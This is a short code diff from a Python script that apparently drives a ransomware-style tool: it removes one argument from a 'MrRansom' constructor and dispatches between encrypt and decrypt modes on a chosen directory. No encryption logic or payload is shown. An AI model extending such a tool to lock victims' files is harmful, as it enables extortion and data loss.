@@ -14,7 +14,7 @@ if __name__ == "__main__":
 
     start_time = time.time()
 
-    ransom = MrRansom(16, os.path.expanduser(args.dir))
+    ransom = MrRansom(os.path.expanduser(args.dir))
     if args.mode == 'e' or args.mode == 'encrypt':
         ransom.encrypt()
     elif args.mode == 'd' or args.mode == 'decrypt':
